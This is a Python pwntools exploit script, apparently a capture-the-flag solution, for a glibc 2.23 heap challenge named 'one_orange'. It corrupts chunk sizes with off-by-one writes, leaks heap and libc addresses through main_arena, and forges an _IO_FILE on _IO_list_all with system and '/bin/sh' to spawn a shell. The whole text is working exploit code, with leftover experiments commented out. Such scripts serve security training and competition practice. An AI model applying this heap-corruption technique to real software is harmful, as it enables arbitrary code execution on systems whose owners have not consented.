from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./one_orange")
#p=remote("competition.blue-whale.me",20637)
elf=ELF("one_orange")

def debug():
    gdb.attach(p)
    pause()

def add(index,size):
    p.recvuntil(b"4.show\n")
    p.sendline(b"1")
    p.recvuntil(b"index?\n")
    p.sendline(str(index))
    p.recvuntil(b"size?\n")
    p.sendline(str(size))

def delete(index):
    p.recvuntil(b"4.show\n")
    p.sendline(b"2")
    p.recvuntil(b"index?\n")
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil(b"4.show\n")
    p.sendline(b"3")
    p.recvuntil(b"index?\n")
    p.sendline(str(index))
    p.recvuntil(b"content:\n")
    p.send(content)

def show(index):
    p.recvuntil(b"4.show\n")
    p.sendline(b"4")
    p.recvuntil(b"index?\n")
    p.sendline(str(index))

# add(0,224)
# edit(0,b"a"*224)
# delete(0)
# #p.recvuntil(b"0x")
# p.recvuntil(b"0x")
# arr_addr=int(p.recv(12),16)
# print("arr_addr :",hex(arr_addr))
# pie_base=arr_addr-0x202060
# print("pie_base :",hex(pie_base))
add(0,0xe8)
add(1,0xf8)
add(2,0xe8)
add(3,0xe8)
edit(0,b"a"*0xe8+p8(0xf1))
edit(1,b"b"*0xf8+p8(0xf1))
edit(2,b"c"*0xe8+p8(0xf1))
edit(3,b"d"*0xe8+p8(0x31))
delete(1)
chunk1_addr=int(p.recvuntil(b"\n")[-13:-1],16)
print("chunk1_addr :",hex(chunk1_addr))
add(1,0xf8)
show(2)
main_arena88=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("main_arena88 :",hex(main_arena88))
#libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libc=ELF("libc-2.23.so")
libc_base=main_arena88-0x10-88-libc.sym["__malloc_hook"]
io_list_all=libc_base+libc.sym["_IO_list_all"]
sys_addr=libc_base+libc.sym["system"]
#execve_addr=[0x4527a,0xf03a4,0xf1247]
edit(1,b"b"*0xd0+p64(0)*3+p64(sys_addr)+b"/bin/sh\x00"+p8(0x61))
payload=p64(0)+p64(io_list_all-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*7
payload+=p64(chunk1_addr+0x100)
payload+=p64(0)*13
payload+=p64(chunk1_addr+0xd0)
edit(2,payload+b"\n")
add(4,0xf0)
#p.interactive()
debug()
#add(4,0xe0)
#debug()
#edit(4,b"e"*8+b"\n")
#add(5,0xe0)

#add(5,0xe0+0x90)
#add(5,0xe8)
#print(hex(libc.sym["__malloc_hook"]))
#main_arena88=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
#print("main_arena88 :",hex(main_arena88))
#show(0)
#debug()